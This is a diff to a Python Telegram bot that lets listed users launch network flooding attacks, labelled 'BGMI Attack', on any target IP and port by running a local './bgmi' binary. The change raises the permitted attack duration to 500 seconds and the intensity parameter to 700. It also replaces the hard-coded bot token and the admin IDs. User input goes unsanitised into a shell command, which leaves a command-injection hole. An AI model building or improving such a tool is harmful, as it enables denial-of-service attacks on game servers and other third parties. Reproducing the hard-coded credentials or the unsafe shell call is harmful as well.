@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7202532685:AAGLATO-6cAbJUVHZL-6UFTtfzuLnWqgZPw')
+bot = telebot.TeleBot('6388100227:AAHhA-VB_6zJ7Jma5rfoLUxNOSIyWXPD1ik')
 
 # Admin user IDs
-admin_id = {"1283324622", "6406776405", "1600832237"}
+admin_id = {"5329962322"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -232,13 +232,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 501:
+                response = "Error: Time interval must be less than 500."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 700"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
